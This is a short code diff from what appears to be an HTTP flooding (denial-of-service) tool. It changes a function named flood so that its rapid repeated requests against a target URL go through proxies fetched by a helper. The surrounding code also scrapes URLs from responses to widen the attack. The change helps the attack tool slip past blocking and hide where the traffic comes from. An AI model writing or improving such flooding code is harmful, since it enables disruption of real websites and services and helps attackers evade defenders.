@@ -71,7 +71,8 @@ def flood(attack_id, url, stoptime) -> None:
                     timeout=(5,0.1), 
                     allow_redirects=False,
                     stream=False,
-                    cert=None
+                    cert=None,
+                    proxies=utils().get_proxy()
                 )
 
                 Core.recursive_urls += scrapeurls(target_url, req.text) # scrape all urls from the requested page
